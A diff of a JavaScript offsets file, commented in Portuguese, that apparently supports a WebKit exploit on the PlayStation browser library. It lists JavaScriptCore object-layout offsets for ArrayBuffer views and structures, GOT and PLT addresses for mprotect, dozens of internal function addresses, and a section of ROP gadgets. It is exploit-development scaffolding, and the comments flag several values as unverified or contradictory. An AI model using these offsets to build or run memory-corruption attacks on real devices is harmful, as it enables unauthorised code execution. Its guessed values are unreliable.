@@ -7,27 +7,36 @@ export const JSC_OFFSETS = {
     JSCell: {
         // VALIDADO: `mov rdx, [rsi+8]` em `JSC::JSObject::put` (funcoes.txt)
         // rsi é JSCell*, rdx é Structure*.
-        STRUCTURE_POINTER_OFFSET: 0x8,
+       
+        STRUCTURE_POINTER_OFFSET: 0x8, // CANDIDATO: Ponteiro para a estrutura Structure
+        // Se o ID estivesse direto na célula: STRUCTURE_ID_OFFSET: 0x0 (ou 0x4), FLAGS_OFFSET: 0x4 (ou 0x0)
+        // Vamos manter seu original por enquanto, mas o STRUCTURE_POINTER_OFFSET acima é uma forte hipótese.
+        STRUCTURE_ID_OFFSET: 0x00, // Seu valor original, VERIFIQUE se é ID direto ou se deve usar o ponteiro acima.
+        FLAGS_OFFSET: 0x04       // Seu valor original
 
-        // Outros campos comuns do JSCell (podem variar, precisam de validação se usados)
-        // CELL_FLAGS_OFFSET: 0x0, // Exemplo, pode conter o tipo e flags de GC
-        // STRUCTURE_ID_OFFSET: 0x4, // Se o ID numérico estivesse inline após flags (menos comum que ponteiro)
+
     },
     Structure: { // Offsets DENTRO da estrutura Structure (apontada por JSCell.STRUCTURE_POINTER_OFFSET)
-        // Estes são mais difíceis de obter sem depuração ou análise mais profunda da struct Structure.
-        // Exemplos do que procurar:
-        // TYPE_INFO_OFFSET: 0x10, // Offset para TypeInfo dentro da Structure
-        // CLASS_INFO_OFFSET: 0x18, // Offset para ClassInfo (contém nome da classe, etc.)
-        // PROTOTYPE_OFFSET: 0x20, // Offset para o objeto protótipo
-        // GLOBAL_OBJECT_OFFSET: 0x0, // Se a Structure tiver um ponteiro para o GlobalObject
+        
+        GLOBAL_OBJECT_OFFSET: 0x00,        // mov [rdi], r8 (r8 = JSGlobalObject*)
+        PROTOTYPE_OFFSET: 0x08,            // mov [rdi+8h], r9 (r9 = JSValue do protótipo)
+        TYPE_INFO_FLAGS_OFFSET: 0x10,      // mov [rdi+10h], eax (TypeInfo.m_flags e .m_type)
+                                           // Este campo provavelmente contém o StructureID real e flags de tipo.
+        INDEXING_TYPE_AND_MISC_OFFSET: 0x18, // mov [rdi+18h], r10d (indexingType)
+        CLASS_INFO_OFFSET: 0x1C,           // mov [rdi+1Ch], rcx (rcx = ClassInfo*)
+       
+        VIRTUAL_PUT_OFFSET: 0x18,          // call qword ptr [rdx+18h] (Pode ser um offset dentro de ClassInfo ou vtable inline)
+                                           // Nota: Este 0x18 é diferente do INDEXING_TYPE_AND_MISC_OFFSET acima. Contexto é chave.
+
+        
     },
     JSObject: {
         // Ponteiro para o Butterfly (armazenamento de propriedades nomeadas)
         // Comum ser após o cabeçalho JSCell (Structure* em 0x8).
-        // Os arquivos TXT não confirmaram este diretamente para JSObject genérico.
         BUTTERFLY_OFFSET: 0x10, // CANDIDATO: Ponteiro para o Butterfly
     },
-    ArrayBuffer: {
+    ArrayBuffer: {    
+
         // Baseado no snippet JSC::ArrayBuffer::create, o ponteiro para ArrayBufferContents
         // não é definido em [rax+8] ou [rax+10h] *nessa função específica*.
         // Ele é zerado e depois os campos do ArrayBufferContents são copiados para o JSArrayBuffer.
@@ -38,16 +47,22 @@ export const JSC_OFFSETS = {
         SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START: 0x18, // Confirmado por `mov [rax+18h], rdx` (onde rdx era m_sizeInBytes)
         // Adicionar o campo que parece conter o m_dataPointer diretamente no JSArrayBuffer
         DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START: 0x20, // Confirmado por `mov [rax+20h], rdx` (onde rdx era m_dataPointer)
+        SHARING_MODE_OFFSET: 0x28,
+        IS_RESIZABLE_FLAGS_OFFSET: 0x30
     },
     ArrayBufferView: { // Para TypedArrays como Uint8Array, Uint32Array, DataView
         // VALIDADO (de JSObjectGetTypedArrayBytesPtr.txt):
         // `mov rax, [rdi+10h]` onde rdi é a View, rax é ArrayBufferContents*
-        CONTENTS_IMPL_POINTER_OFFSET: 0x10, // Ponteiro para ArrayBufferContents
+        CONTENTS_IMPL_POINTER_OFFSET: 0x10, // Ponteiro para ArrayBufferContents             
+        STRUCTURE_ID_OFFSET: 0x00,           // Seu original.
+        FLAGS_OFFSET: 0x04,                  // Seu original.
+        ASSOCIATED_ARRAYBUFFER_OFFSET: 0x08, // Ponteiro para o JSArrayBuffer.
+        M_VECTOR_OFFSET: 0x10,               // Ponteiro para os dados (dentro do ArrayBuffer.m_impl->data()).
+        M_LENGTH_OFFSET: 0x18,               // Comprimento da view.
+        M_MODE_OFFSET: 0x1C                  // Modo (ex: WastefulWriting).
 
-        // Outros campos comuns em Views (precisam de validação):
-        // LENGTH_OFFSET: 0x18, // Número de elementos na view
-        // BYTE_OFFSET_IN_BUFFER: 0x20, // Offset em bytes dentro do ArrayBuffer
-        // MODE_OFFSET: 0x24, // Ex: WastefulSweeping, NonWastefulSweeping
+
+        
     },
     ArrayBufferContents: { // Estrutura apontada por ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET
                            // e ArrayBufferView.CONTENTS_IMPL_POINTER_OFFSET
@@ -66,8 +81,8 @@ export const JSC_OFFSETS = {
     },
     JSFunction: {
         // Estes são mais complexos e dependem da estrutura JSFunction específica
-        // EXECUTABLE_OFFSET: 0x18, // Ponteiro para FunctionExecutable
-        // SCOPE_OFFSET: 0x20,      // Ponteiro para JSScope
+         EXECUTABLE_OFFSET: 0x18, // Ponteiro para FunctionExecutable
+         SCOPE_OFFSET: 0x20,      // Ponteiro para JSScope
     },
     // ... (outras estruturas como SymbolObject, etc., podem ser adicionadas conforme necessário)
 
@@ -107,8 +122,41 @@ export const WEBKIT_LIBRARY_INFO = {
     // Offsets de entradas na Global Offset Table (GOT) que apontam para funções
     // em outras bibliotecas (ex: libc, libkernel). Ler estes pode vazar endereços de outras libs.
     GOT_ENTRIES: {
-        // Exemplo: "got_memcpy": 0x2F00120, // Offset da entrada da GOT para memcpy
+        "mprotect": "0x3CBD820",
         // Exemplo: "got_pthread_create": 0x2F00128,
+
+    FUNCTION_OFFSETS: { // Offsets relativos ao base do módulo principal (libSceNKWebkit.sprx)
+        "JSC::JSFunction::create": "0x58A1D0",                 // download (4), (26), (28)
+        "JSC::InternalFunction::createSubclassStructure": "0xA86580", // download (5), (6)
+        "WTF::StringImpl::destroy": "0x10AA800",               // download (7), (10)
+        "bmalloc::Scavenger::schedule": "0x2EBDB0",             // download (7)
+        "WebCore::JSLocation::createPrototype": "0xD2E30",       // download (34)
+        "WebCore::cacheDOMStructure": "0x740F30",              // download (11), (21), (20)
+        "mprotect_plt_stub": "0x1A08",                         // download (22) (PLT stub, jmps para GOT)
+        "JSC::JSWithScope::create": "0x9D6990",                // download (23)
+        "JSC::JSObject::putByIndex": "0x1EB3B00",             // download (24)
+        "JSC::JSInternalPromise::create": "0x112BB00",        // download (25)
+        "JSC::JSInternalPromise::then": "0x1BC2D70",          // download (16)
+        "JSC::loadAndEvaluateModule": "0xFC2900",              // download (27)
+        "JSC::ArrayBuffer::create_from_arraybuffer_ref": "0x170A490", // download (29), (30) (create(ArrayBuffer&))
+        "JSC::ArrayBuffer::create_from_contents": "0x10E5320", // download (37) (create(ArrayBufferContents&&))
+        "JSC::SymbolObject::finishCreation": "0x102C8F0",       // download (31)
+        "JSC::StructureCache::emptyStructureForPrototypeFromBaseStructure": "0xCCF870", // download (32)
+        "JSC::JSObject::put": "0xBD68B0",                     // download (33)
+        "JSC::Structure::Structure_constructor": "0x1638A50",    // download (36)
+        "WTF::fastMalloc": "0x1271810",                        // download (10) - verifique se é o mais comum
+        "WTF::fastFree": "0x230C7D0",                          // download (14) - verifique se é o mais comum
+        "JSValueIsSymbol": "0x126D940",                         // download (17)
+        "JSC::JSArray::getOwnPropertySlot": "0x2322630",       // download (18)
+        "JSC::JSGlobalObject::visitChildren_JSCell": "0x1A5F740", // download (19)
+        "JSC::JSCallee::JSCallee_constructor": "0x2038D50",      // download (20)
+
+        // Gadgets ROP/JOP que você encontrar:
+        "gadget_lea_rax_rdi_plus_20_ret": "0x58B860",         // download (3)
+        // Adicione mais gadgets aqui
+    }
+
+        
     }
 };
 
